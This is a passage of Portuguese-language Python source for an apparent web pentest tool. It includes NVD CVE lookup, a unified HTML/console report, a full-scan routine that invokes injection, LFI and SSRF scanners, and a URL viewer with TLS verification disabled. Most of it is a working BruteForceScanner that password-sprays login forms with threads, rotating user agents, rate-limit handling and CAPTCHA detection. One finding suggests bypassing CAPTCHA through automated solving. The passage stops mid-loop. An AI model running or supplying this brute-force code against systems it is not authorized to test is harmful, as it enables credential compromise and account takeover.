            if data and not return_findings:
                console.print(f"[bold green]✓ {len(data)} registo(s) recebido(s) da API. A processar...[/bold green]")

            api_succeeded = True
            
        except requests.exceptions.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Erro de rede ao consultar a API da NVD: {e}[/bold red]")
            return []
        except json.JSONDecodeError:
            if not return_findings: console.print(f"[bold red][!] Erro: A resposta da API da NVD não é um JSON válido.[/bold red]")
            return []
        finally:
            if api_succeeded:
                cache[cache_key] = {'timestamp': datetime.now().isoformat(), 'data': data}
                _save_cve_cache(cache)

    if not data:
        if not return_findings: console.print("[bold yellow][-] Nenhuma CVE encontrada para esta versão na base de dados da NVD.[/bold yellow]")
        return []

    findings = []
    if not return_findings:
        table = Table(title=f"CVEs Encontradas para {product} v{version}")
        table.add_column("CVE ID", style="yellow", no_wrap=True)
        table.add_column("CVSS", style="magenta", justify="center")
        table.add_column("Publicado em", style="blue")
        table.add_column("Resumo", style="white")
    
    for vuln in data:
        cvss = _get_cvss_score(vuln)
        
        if cvss >= min_cvss:
            cve_id = vuln['cve']['id']
            summary = vuln['cve']['descriptions'][0]['value']
            published_date = vuln['cve']['published'].split('T')[0]
            
            if return_findings:
                findings.append({"ID": cve_id, "CVSS": cvss, "Resumo": summary, "Produto": product, "Versão": version, "Data": published_date})
            else:
                risk_color = "red" if cvss >= 7.0 else "yellow" if cvss >= 4.0 else "green"
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                cve_id_text = Text(cve_id, style=f"link {link}")
                table.add_row(cve_id_text, f"[{risk_color}]{cvss:.1f}[/{risk_color}]", published_date, summary)

    if not return_findings:
        if table.row_count > 0:
            console.print(table)
        else:
            console.print(f"[bold yellow][-] Nenhuma CVE encontrada que corresponda ao critério de CVSS >= {min_cvss}.[/bold yellow]")
        console.print("-" * 60)
        
    return findings

# --- MÓDULO 21: UNIFIED FULL SCAN ---

class UnifiedReport:
    """Classe para consolidar e apresentar os resultados de múltiplos scanners."""

    def __init__(self, url):
        self.url = url
        self.all_findings = []
        self.tech_findings = {}
        self.cve_findings = []

    def add_findings(self, findings):
        if findings:
            self.all_findings.extend(findings)
            
    def add_cve_findings(self, findings):
        if findings:
            self.cve_findings.extend(findings)

    def present_report(self, output_file=None):
        """Apresenta um relatório unificado de todas as descobertas na consola ou em HTML."""
        if output_file:
            self.generate_html_report(output_file)
        else:
            self.present_console_report()

    def present_console_report(self):
        """Apresenta o relatório na consola."""
        console.print(Panel(f"[bold]Relatório de Análise de Segurança para: {self.url}[/bold]", style="bold white on blue", expand=False))

        if not self.all_findings and not self.cve_findings:
            console.print("\n[bold green]✅ Nenhuma vulnerabilidade ou má configuração crítica foi encontrada.[/bold green]")
            console.print("=" * 80)
            return

        if self.cve_findings:
            console.print("\n[bold]Vulnerabilidades Conhecidas (CVEs) Encontradas[/bold]")
            cve_table = Table(title="CVEs por Tecnologia")
            cve_table.add_column("Produto", style="cyan")
            cve_table.add_column("Versão", style="cyan")
            cve_table.add_column("CVE ID", style="yellow")
            cve_table.add_column("CVSS", style="magenta")
            cve_table.add_column("Data", style="blue")
            cve_table.add_column("Resumo", style="white")
            for f in sorted(self.cve_findings, key=lambda x: (x.get('Produto'), float(x.get('CVSS', 0) or 0)), reverse=True):
                cvss = f.get('CVSS', 0.0)
                if cvss is None: cvss = 0.0
                risk_color = "red" if cvss >= 7.0 else "yellow" if cvss >= 4.0 else "green"
                cve_id = f.get('ID')
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                cve_id_text = Text(cve_id, style=f"link {link}")
                cve_table.add_row(f.get("Produto"), f.get("Versão"), cve_id_text, f"[{risk_color}]{cvss:.1f}[/{risk_color}]", f.get("Data"), f.get("Resumo"))
            console.print(cve_table)
            console.print("-" * 80)

        if self.all_findings:
            console.print("\n[bold]Resultados da Análise de Vulnerabilidades[/bold]")
            risk_order = {"Crítico": 0, "Alto": 1, "Médio": 2, "Baixo": 3}
            sorted_findings = sorted(self.all_findings, key=lambda x: risk_order.get(x["Risco"], 99))
            
            table = Table(title="Resultados Consolidados")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo de Vulnerabilidade", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")

            risk_styles = {"Crítico": "bold white on red", "Alto": "bold red", "Médio": "bold yellow", "Baixo": "bold green"}

            for f in sorted_findings:
                risk = f.get("Risco", "Info")
                style = risk_styles.get(risk, "white")
                table.add_row(f"[{style}]{risk}[/{style}]", f.get("Tipo"), f.get("Detalhe"), f.get("Recomendação"))
                
            console.print(table)
        
        console.print("=" * 80)

    def generate_html_report(self, filename):
        """Gera um relatório HTML com os resultados."""
        html = f"""
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Relatório de Segurança para {self.url}</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; background-color: #f0f2f5; color: #1c1e21; }}
                .container {{ max-width: 1200px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                h1, h2 {{ color: #1c1e21; border-bottom: 2px solid #1877f2; padding-bottom: 10px; }}
                h1 {{ font-size: 2em; }}
                h2 {{ font-size: 1.5em; margin-top: 30px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th, td {{ padding: 12px 15px; border: 1px solid #ddd; text-align: left; word-break: break-word; }}
                th {{ background-color: #1877f2; color: white; font-weight: bold; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
                .risco-Crítico {{ background-color: #be2525; color: white; font-weight: bold; }}
                .risco-Alto {{ background-color: #fa5805; color: white; font-weight: bold; }}
                .risco-Médio {{ background-color: #ffc300; color: #333; }}
                .risco-Baixo {{ background-color: #5cb85c; color: white; }}
                .cvss-high {{ color: #be2525; font-weight: bold; }}
                .cvss-medium {{ color: #f0ad4e; font-weight: bold; }}
                .cvss-low {{ color: #5cb85c; }}
                a {{ color: #1877f2; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                p {{ line-height: 1.6; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Relatório de Análise de Segurança</h1>
                <p><strong>Alvo:</strong> {self.url}</p>
                <p><strong>Data:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                
                <h2>Tecnologias Detectadas</h2>
                <table>
                    <tr><th>Categoria</th><th>Tecnologia(s)</th></tr>
        """
        tech_found = False
        if self.tech_findings:
            for category, techs in self.tech_findings.items():
                if techs:
                    tech_found = True
                    html += f"<tr><td>{category}</td><td>{', '.join(techs)}</td></tr>"
        if not tech_found:
             html += "<tr><td colspan='2'>Nenhuma tecnologia específica detectada.</td></tr>"
        html += "</table>"

        if self.cve_findings:
            html += "<h2>Vulnerabilidades Conhecidas (CVEs)</h2><table><tr><th>Produto</th><th>Versão</th><th>CVE ID</th><th>CVSS</th><th>Data</th><th>Resumo</th></tr>"
            for f in sorted(self.cve_findings, key=lambda x: (x.get('Produto'), float(x.get('CVSS', 0) or 0)), reverse=True):
                cvss = f.get('CVSS', 0.0)
                if cvss is None: cvss = 0.0
                cvss_class = "cvss-high" if cvss >= 7.0 else "cvss-medium" if cvss >= 4.0 else "cvss-low"
                cve_id = f.get('ID')
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                html += f"<tr><td>{f.get('Produto')}</td><td>{f.get('Versão')}</td><td><a href='{link}' target='_blank'>{cve_id}</a></td><td class='{cvss_class}'>{cvss:.1f}</td><td>{f.get('Data')}</td><td>{f.get('Resumo')}</td></tr>"
            html += "</table>"

        html += "<h2>Resultados da Análise de Vulnerabilidades</h2>"
        if not self.all_findings:
            html += "<p>Nenhuma vulnerabilidade encontrada na análise.</p>"
        else:
            html += "<table><tr><th>Risco</th><th>Tipo</th><th>Detalhe</th><th>Recomendação</th></tr>"
            risk_order = {"Crítico": 0, "Alto": 1, "Médio": 2, "Baixo": 3}
            sorted_findings = sorted(self.all_findings, key=lambda x: risk_order.get(x["Risco"], 99))
            for f in sorted_findings:
                risk = f.get("Risco", "Info")
                html += f"""
                    <tr>
                        <td class="risco-{risk}">{risk}</td>
                        <td>{f.get("Tipo")}</td>
                        <td>{f.get("Detalhe")}</td>
                        <td>{f.get("Recomendação")}</td>
                    </tr>
                """
            html += "</table>"
        
        html += "</div></body></html>"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)
            console.print(f"\n[bold green]✅ Relatório HTML salvo em: {filename}[/bold green]")
        except IOError as e:
            console.print(f"\n[bold red][!] Erro ao salvar o relatório HTML: {e}[/bold red]")


def full_scan(url, output_file=None, min_cvss=0.0, no_cache=False):
    """Executa uma bateria de testes e apresenta um relatório unificado."""
    report = UnifiedReport(url)
    
    console.print("[bold blue]Iniciando análise completa...[/bold blue]")

    # Fase 1: Reconhecimento
    console.print("\n[bold]--- Fase 1: Reconhecimento e Análise de Configuração ---[/bold]")
    with console.status("[bold green]Detectando tecnologias...[/bold green]"):
        report.tech_findings = detect_technologies(url, return_findings=True)
    console.print("[bold green]✓ Detecção de tecnologias concluída.[/bold green]")

    # Fase 2: Análise de CVEs
    console.print("\n[bold]--- Fase 2: Análise de Vulnerabilidades Conhecidas (CVEs) ---[/bold]")
    all_techs = [tech for tech_list in report.tech_findings.values() for tech in tech_list]
    parsed_techs = set()
    for tech_str in all_techs:
        # Tenta extrair 'produto/versão' (ex: Apache/2.4.41) ou 'produto versão' (ex: WordPress 5.8.1)
        # Regex melhorado para capturar mais variações
        match = re.search(r'([\w.-]+)(?:/|[\s-]?v| version )([\d][\d.]*[\d]?)', tech_str, re.IGNORECASE)
        if match:
            product, version = match.groups()
            product = product.lower().replace(' ', '-')
            parsed_techs.add((product, version))
        else: # Caso especial para tags meta generator sem versão explícita
             match_gen = re.search(r'([\w\s]+)\s+([\d.]+)', tech_str)
             if match_gen:
                product, version = match_gen.groups()
                product = product.strip().lower().replace(' ', '-')
                parsed_techs.add((product, version))


    if parsed_techs:
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
            task = progress.add_task("[green]Verificando CVEs...", total=len(parsed_techs))
            for product, version in parsed_techs:
                progress.update(task, advance=1, description=f"Verificando CVEs para {product} v{version}")
                cve_findings = cve_scan(product, version, min_cvss=min_cvss, no_cache=no_cache, return_findings=True)
                report.add_cve_findings(cve_findings)
        console.print(f"[bold green]✓ Análise de CVEs concluída. Encontradas {len(report.cve_findings)} CVEs correspondentes.[/bold green]")
    else:
        console.print("[yellow]Nenhuma tecnologia com versão foi identificada para a busca de CVEs.[/yellow]")

    # Fase 3: Scanning de Vulnerabilidades Ativas
    console.print("\n[bold]--- Fase 3: Scanning de Vulnerabilidades Ativas ---[/bold]")
    scanner_classes = {
        "Configurações Gerais": VulnerabilityScanner,
        "SQL Injection": SQLiScanner,
        "Cross-Site Scripting": XSSScanner,
        "Command Injection": CommandInjectionScanner,
        "Local File Inclusion": LFIScanner,
        "Server-Side Request Forgery": SSRFScanner,
        "Open Redirect": OpenRedirectScanner
    }
    
    for name, scanner_class in scanner_classes.items():
        console.print(f"[*] Executando scanner de [bold cyan]{name}[/bold cyan]...")
        scanner = scanner_class(url)
        findings = scanner.run_scan(return_findings=True)
        report.add_findings(findings)
        console.print(f"[bold green]✓ Scanner de {name} concluído.[/bold green]")

    # Fase 4: Geração do Relatório Final
    console.print("\n[bold]--- Fase 4: Geração do Relatório Final ---[/bold]")
    report.present_report(output_file)

# --- MÓDULO 22: VISUALIZADOR DE ARQUIVOS POR URL ---

def view_file_from_url(url):
    """Baixa e exibe o conteúdo de um arquivo a partir de um URL."""
    console.print("-" * 60)
    console.print(f"[*] Visualizando arquivo de: [bold cyan]{url}[/bold cyan]")
    console.print("-" * 60)

    try:
        with console.status("[bold green]Baixando o arquivo...[/bold green]"):
            response = requests.get(url, timeout=15, stream=True, verify=False)
            response.raise_for_status()

        content_type = response.headers.get('Content-Type', '').lower()
        content_length = response.headers.get('Content-Length')

        console.print(f"[bold]Tipo de Conteúdo:[/bold] {content_type}")
        if content_length:
            try:
                size_kb = int(content_length) / 1024
                console.print(f"[bold]Tamanho do Arquivo:[/bold] {size_kb:.2f} KB")
            except (ValueError, TypeError):
                console.print(f"[bold]Tamanho do Arquivo:[/bold] {content_length}")
        
        console.print("-" * 60)

        if any(t in content_type for t in ['text', 'json', 'xml', 'javascript', 'css']):
            text_content = response.text
            console.print(f"[bold green]Conteúdo do Arquivo (Texto):[/bold green]")
            
            syntax_lexer = "default"
            if 'html' in content_type: syntax_lexer = 'html'
            elif 'json' in content_type: syntax_lexer = 'json'
            elif 'css' in content_type: syntax_lexer = 'css'
            elif 'javascript' in content_type: syntax_lexer = 'javascript'
            elif url.endswith('.py'): syntax_lexer = 'python'
            elif url.endswith('.xml'): syntax_lexer = 'xml'
            
            if len(text_content) > 5000:
                 console.print("[yellow]O arquivo é muito grande. Exibindo os primeiros 5000 caracteres.[/yellow]")
                 text_content = text_content[:5000]

            syntax = Syntax(text_content, syntax_lexer, theme="monokai", line_numbers=True)
            console.print(syntax)

        elif 'image' in content_type:
            console.print("[bold yellow]Arquivo é uma imagem.[/bold yellow]")
            console.print("Visualizar o conteúdo de imagens no terminal não é suportado.")
            console.print("Use o comando 'meta' para tentar extrair metadados EXIF se for uma JPEG.")
            try:
                img_content = response.content
                img = Image.open(BytesIO(img_content))
                console.print(f"[bold]Formato da Imagem:[/bold] {img.format}")
                console.print(f"[bold]Dimensões:[/bold] {img.size[0]}x{img.size[1]} pixels")
                console.print(f"[bold]Modo:[/bold] {img.mode}")
            except Exception as e:
                console.print(f"[red]Não foi possível analisar os detalhes da imagem: {e}[/red]")

        else:
            console.print("[bold yellow]O tipo de arquivo não é texto e não pode ser exibido diretamente.[/bold yellow]")
            console.print("O arquivo foi identificado como binário.")

    except requests.exceptions.HTTPError as e:
        console.print(f"[bold red][!] Erro HTTP: {e.response.status_code} {e.response.reason}[/bold red]")
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][!] Erro ao acessar a URL: {e}[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    finally:
        console.print("-" * 60)

# --- MÓDULO 23: SCANNER DE FORÇA BRUTA (REFATORADO) ---

class BruteForceScanner:
    """Scanner para realizar ataques de força bruta em formulários de login."""
    def __init__(self, url, user_field='username', pass_field='password', users=None, pass_wordlist_path=None,
                 failure_string=None, success_string=None, workers=5, delay=1.0, attack_mode='battering_ram',
                 max_retries=3, backoff_factor=2.0, session_pool_size=10, enable_logging=False):
        # Normaliza URL
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        self.url = url
        self.user_field = user_field
        self.pass_field = pass_field
        self.users = users or []
        self.pass_wordlist_path = pass_wordlist_path
        self.failure_string = failure_string
        self.success_string = success_string
        self.workers = workers
        self.delay = delay
        self.attack_mode = attack_mode
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.session_pool_size = session_pool_size
        self.enable_logging = enable_logging
        
        # Configuração de sessão pool
        self.session_pool = []
        for _ in range(session_pool_size):
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            self.session_pool.append(session)
        
        # Armazenamento de resultados
        self.findings = []
        self.statistics = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'failed_attempts': 0,
            'captcha_detected': 0,
            'rate_limited': 0,
            'timeouts': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Controle de threads
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._session_lock = threading.Lock()
        self._session_index = 0
        
        # User agents para rotação
        self._user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        # Padrões de detecção
        self.captcha_patterns = [
            r'captcha', r'recaptcha', r'g-recaptcha', r'hcaptcha', r'cloudflare',
            r'verify.*human', r'anti.*bot', r'security.*check', r'robot.*check'
        ]
        
        self.rate_limit_patterns = [
            r'too.*many.*requests', r'rate.*limit', r'temporarily.*blocked',
            r'retry.*later', r'slow.*down', r'flood.*protection', r'abuse.*detected'
        ]
        
        self.success_indicators = [
            r'welcome', r'dashboard', r'profile', r'logout', r'admin.*panel',
            r'member.*area', r'user.*panel', r'home.*page', r'main.*menu'
        ]
        
        self.failure_indicators = [
            r'invalid.*credentials', r'wrong.*password', r'incorrect.*username',
            r'login.*failed', r'authentication.*failed', r'access.*denied',
            r'unauthorized', r'forbidden', r'error.*login'
        ]
        
        # Logging setup
        if self.enable_logging:
            import logging
            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
            self.logger = logging.getLogger(__name__)
        else:
            self.logger = None

    def _get_session(self):
        """Obtém uma sessão do pool de forma thread-safe."""
        with self._session_lock:
            session = self.session_pool[self._session_index]
            self._session_index = (self._session_index + 1) % len(self.session_pool)
            return session
    
    def _log(self, message, level='info'):
        """Log message if logging is enabled."""
        if self.logger:
            getattr(self.logger, level)(message)
    
    def _detect_captcha(self, response_text):
        """Detecta presença de CAPTCHA na resposta."""
        response_lower = response_text.lower()
        for pattern in self.captcha_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        return False
    
    def _detect_rate_limiting(self, response):
        """Detecta se houve rate limiting."""
        if response.status_code == 429:
            return True
        
        response_lower = response.text.lower()
        for pattern in self.rate_limit_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        return False
    
    def _enhanced_success_detection(self, response, _username, _password):
        """Detecção aprimorada de login bem-sucedido."""
        # Verifica string de sucesso definida pelo usuário
        if self.success_string and self.success_string in response.text:
            return True
        
        # Verifica string de falha definida pelo usuário
        if self.failure_string and self.failure_string not in response.text:
            return True
        
        # Heurísticas baseadas em padrões comuns
        response_lower = response.text.lower()
        
        # Verifica indicadores de sucesso
        success_score = 0
        for pattern in self.success_indicators:
            if re.search(pattern, response_lower, re.IGNORECASE):
                success_score += 1
        
        # Verifica indicadores de falha
        failure_score = 0
        for pattern in self.failure_indicators:
            if re.search(pattern, response_lower, re.IGNORECASE):
                failure_score += 1
        
        # Verifica redirecionamentos (indicativo de sucesso)
        if len(response.history) > 0:
            success_score += 2
        
        # Verifica tamanho da resposta (respostas de sucesso tendem a ser maiores)
        if len(response.content) > 1000:
            success_score += 1
        
        # Verifica status codes
        if response.status_code in [200, 302, 301]:
            success_score += 1
        
        # Decisão baseada em score
        return success_score > failure_score and success_score >= 2
    
    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona uma descoberta à lista de resultados."""
        finding = {
            "Risco": risk,
            "Tipo": v_type,
            "Detalhe": detail,
            "Recomendação": recommendation
        }
        self.findings.append(finding)
        self._log(f"Finding added: {v_type} - {detail}")
    
    def _load_wordlist(self, file_path):
        """Carrega wordlist de um arquivo."""
        try:
            with open(file_path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"[bold red][!] Arquivo de wordlist não encontrado: {file_path}[/bold red]")
            return []
        except Exception as e:
            console.print(f"[bold red][!] Erro ao ler wordlist: {e}[/bold red]")
            return []

    def _get_login_form(self):
        """Obtém detalhes do formulário de login com retry logic."""
        session = self._get_session()
        
        for attempt in range(self.max_retries):
            try:
                self._log(f"Attempting to fetch login form (attempt {attempt + 1}/{self.max_retries})")
                response = session.get(self.url, verify=False, timeout=10)
                
                # Verifica se há CAPTCHA
                if self._detect_captcha(response.text):
                    self.statistics['captcha_detected'] += 1
                    self._log("CAPTCHA detected on login form", 'warning')
                    self._add_finding("Médio", "CAPTCHA Detectado", 
                                    "Formulário de login possui CAPTCHA", 
                                    "Considere desabilitar CAPTCHA para testes ou use soluções automatizadas")
                
                soup = BeautifulSoup(response.content, 'html.parser')
                break
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                self.statistics['timeouts'] += 1
                if attempt < self.max_retries - 1:
                    wait_time = self.backoff_factor ** attempt
                    self._log(f"Connection error, retrying in {wait_time}s: {e}", 'warning')
                    time.sleep(wait_time)
                    continue
                else:
                    self._log(f"Failed to connect after {self.max_retries} attempts: {e}", 'error')
                    console.print(f"[bold red][!] Erro de conexão: {e}[/bold red]")
                    return None, None, None, None
        
        try:
            # Busca formulário com campos de login
            form = None
            for f in soup.find_all('form'):
                if f.find('input', {'name': self.user_field}) and f.find('input', {'name': self.pass_field}):
                    form = f
                    break
            
            if not form:
                self._log(f"Login form not found with fields '{self.user_field}' and '{self.pass_field}'", 'error')
                console.print(f"[bold red][!] Formulário não encontrado com campos '{self.user_field}' e '{self.pass_field}'[/bold red]")
                return None, None, None, None

            action_url = urljoin(self.url, form.get('action', self.url))
            method = form.get('method', 'post').lower()
            
            # Extrai todos os campos do formulário
            form_data = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                if name:
                    form_data[name] = value
            
            # Extrai cookies de sessão
            cookies = session.cookies.get_dict()
            
            self._log(f"Form found: {action_url} ({method.upper()})")
            self._log(f"Form data fields: {list(form_data.keys())}")
            
            return action_url, method, form_data, cookies
        except Exception as e:
            self._log(f"Error parsing form: {e}", 'error')
            console.print(f"[bold red][!] Erro ao analisar formulário: {e}[/bold red]")
            return None, None, None, None

    def _test_credential(self, username, password, action_url, method, form_data, cookies):
        """Testa um par de credenciais com retry logic aprimorado."""
        if self._stop_event.is_set():
            return None

        # Delay entre tentativas
        if self.delay > 0:
            import random
            time.sleep(self.delay + random.uniform(0, 0.5))

        session = self._get_session()
        
        for attempt in range(self.max_retries):
            try:
                self.statistics['total_attempts'] += 1
                
                # Prepara payload
                payload = form_data.copy()
                payload[self.user_field] = username
                payload[self.pass_field] = password
                
                # Headers realistas
                import random
                headers = {
                    'Referer': self.url,
                    'User-Agent': random.choice(self._user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                # Aplica cookies de sessão
                if cookies:
                    session.cookies.update(cookies)
                
                if method == 'post':
                    response = session.post(action_url, data=payload, headers=headers, 
                                          verify=False, timeout=10, allow_redirects=True)
                else:
                    response = session.get(action_url, params=payload, headers=headers, 
                                         verify=False, timeout=10, allow_redirects=True)
                
                # Verifica rate limiting
                if self._detect_rate_limiting(response):
                    self.statistics['rate_limited'] += 1
                    self._log(f"Rate limiting detected for {username}:{password}", 'warning')
                    # Aumenta delay para próximas tentativas
                    time.sleep(self.delay * 2)
                    continue
                
                # Verifica CAPTCHA
                if self._detect_captcha(response.text):
                    self.statistics['captcha_detected'] += 1
                    self._log(f"CAPTCHA detected for {username}:{password}", 'warning')
                    return 'captcha'
                
                # Análise da resposta com detecção aprimorada
                success = self._enhanced_success_detection(response, username, password)
                
                if success:
                    self.statistics['successful_attempts'] += 1
                    self._log(f"Successful login found: {username}:{password}")
                    with self._lock:
                        if not self._stop_event.is_set():
                            self._stop_event.set()
                            return (username, password)
                else:
                    self.statistics['failed_attempts'] += 1
                    self._log(f"Failed login attempt: {username}:{password}", 'debug')
                
                break
                
            except requests.RequestException as e:
                self.statistics['timeouts'] += 1
                if attempt < self.max_retries - 1:
                    wait_time = self.backoff_factor ** attempt
                    self._log(f"Request failed, retrying in {wait_time}s: {e}", 'warning')
                    time.sleep(wait_time)
                    continue
                else:
                    self._log(f"Request failed after {self.max_retries} attempts: {e}", 'error')
                    break
        
        return None

    def _generate_credential_tasks(self, passwords):
        """Gera lista de tarefas baseada no modo de ataque."""
        tasks = []
        
        if self.attack_mode == 'battering_ram':
            # Um usuário, múltiplas senhas
            if self.users:
                username = self.users[0]
                tasks = [(username, p) for p in passwords]
        elif self.attack_mode == 'pitchfork':
            # Pares usuario:senha
            tasks = [(u.split(':', 1)[0], u.split(':', 1)[1]) for u in self.users if ':' in u]
        elif self.attack_mode == 'cluster_bomb':
            # Todos os usuários vs todas as senhas
            tasks = list(itertools.product(self.users, passwords))
        
        return tasks
    
    def run_scan(self, return_findings=False):
        """Executa o ataque de força bruta."""
        console.print("-" * 60)
        console.print(f"[*] Iniciando ataque de força bruta em: [bold cyan]{self.url}[/bold cyan]")
        console.print(f"[*] Modo de Ataque: [bold yellow]{self.attack_mode}[/bold yellow]")
        if self.success_string:
            console.print(f"[*] String de sucesso: [green]'{self.success_string}'[/green]")
        if self.failure_string:
            console.print(f"[*] String de falha: [red]'{self.failure_string}'[/red]")
        console.print("-" * 60)

        # Carrega wordlist
        if not self.pass_wordlist_path:
            console.print("[bold red][!] Wordlist não especificada[/bold red]")
            return self.findings if return_findings else None
            
        passwords = self._load_wordlist(self.pass_wordlist_path)
        if not passwords:
            console.print("[bold red][!] Nenhuma senha carregada[/bold red]")
            return self.findings if return_findings else None
        
        # Gera tarefas
        tasks = self._generate_credential_tasks(passwords)
        if not tasks:
            console.print("[bold red][!] Nenhuma tarefa gerada[/bold red]")
            return self.findings if return_findings else None

        # Obtém formulário
        action_url, method, form_data, cookies = self._get_login_form()
        if not action_url:
            return self.findings if return_findings else None

        console.print(f"[*] Formulário encontrado: [cyan]{action_url}[/cyan] ([cyan]{method.upper()}[/cyan])")
        console.print(f"[*] Testando {len(tasks)} combinações de credenciais...")

        # Executa teste
        found_credential = None
        captcha_blocked = False
        
        # Para garantir que o delay seja respeitado, vamos controlar as submissões
        if self.workers == 1:
            # Modo sequencial: uma tentativa por vez respeitando o delay
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}"),
                BarColumn(bar_width=40),
                "[progress.percentage]{task.percentage:>3.1f}%",
                "|",
                TextColumn("[bold green]{task.completed}[/bold green]/[bold cyan]{task.total}[/bold cyan]"),
                "|",
                TextColumn("[yellow]{task.fields[current_combo]}[/yellow]"),
                "|",
                TextColumn("[red]Falhas: {task.fields[failures]}[/red]"),
                "|",
                TimeRemainingColumn(),
                console=console,
                transient=return_findings
            ) as progress:
                task_id = progress.add_task(
                    "[bold cyan]Testando credenciais sequencialmente...",
                    total=len(tasks),
                    current_combo="Iniciando...",
                    failures=0
                )
                
                for _, (user, pwd) in enumerate(tasks):
                    if self._stop_event.is_set():
                        break
                    
                    current_attempt = f"{user}:{pwd[:3]}{'*' * max(0, len(pwd) - 3)}"
                    progress.update(task_id, current_combo=f"Testando {current_attempt}")
                    
                    result = self._test_credential(user, pwd, action_url, method, form_data, cookies)
                    
                    if result == 'captcha':
                        captcha_blocked = True
                        self._log("CAPTCHA blocking detected, stopping attack", 'warning')
                        progress.update(task_id, current_combo="[red]CAPTCHA detectado![/red]")
                        break
                    elif result:
                        found_credential = result
                        progress.update(task_id, current_combo=f"[bold green]✓ {current_attempt}[/bold green]")
                        break
                    else:
                        self.statistics['failed_attempts'] += 1
                        progress.update(
                            task_id, 
                            advance=1,
                            current_combo=current_attempt,
                            failures=self.statistics['failed_attempts']
                        )
        else:
            # Modo paralelo: múltiplas tentativas simultâneas (delay menos preciso)
            with ThreadPoolExecutor(max_workers=self.workers) as executor:
                future_to_cred = {executor.submit(self._test_credential, user, pwd, action_url, method, form_data, cookies): (user, pwd) for user, pwd in tasks}
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[bold blue]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.1f}%",
                    "|",
                    TextColumn("[bold green]{task.completed}[/bold green]/[bold cyan]{task.total}[/bold cyan]"),
                    "|",
                    TextColumn("[yellow]{task.fields[current_combo]}[/yellow]"),
                    "|",
                    TextColumn("[red]Falhas: {task.fields[failures]}[/red]"),
                    "|",
                    TimeRemainingColumn(),
                    console=console,
                    transient=return_findings
                ) as progress:
                    task_id = progress.add_task(
                        "[bold cyan]Testando credenciais em paralelo...",
                        total=len(tasks),
                        current_combo="Iniciando...",
                        failures=0
                    )
                
                for future in as_completed(future_to_cred):
                    if self._stop_event.is_set():
                        # Cancela tarefas pendentes
                        for f in future_to_cred:
                            f.cancel()
                        break
                    
                    try:
                        result = future.result(timeout=1)
                        cred = future_to_cred[future]
                        current_attempt = f"{cred[0]}:{cred[1][:3]}{'*' * max(0, len(cred[1]) - 3)}"
                        
                        if result == 'captcha':
                            captcha_blocked = True
                            self._log("CAPTCHA blocking detected, stopping attack", 'warning')
                            progress.update(task_id, current_combo="[red]CAPTCHA detectado![/red]")
                            for f in future_to_cred:
                                if not f.done():
                                    f.cancel()
                            break
                        elif result:
                            found_credential = result
                            progress.update(task_id, current_combo=f"[bold green]✓ {current_attempt}[/bold green]")
                            # Cancela tarefas pendentes
                            for f in future_to_cred:
                                if not f.done():
                                    f.cancel()
                            break
                        else:
                            self.statistics['failed_attempts'] += 1
                            progress.update(
                                task_id, 
                                advance=1,
                                current_combo=current_attempt,
                                failures=self.statistics['failed_attempts']
                            )
                        
                    except (concurrent.futures.TimeoutError, Exception):
                        cred = future_to_cred[future]
                        current_attempt = f"{cred[0]}:{cred[1][:3]}{'*' * max(0, len(cred[1]) - 3)}"
                        self.statistics['failed_attempts'] += 1
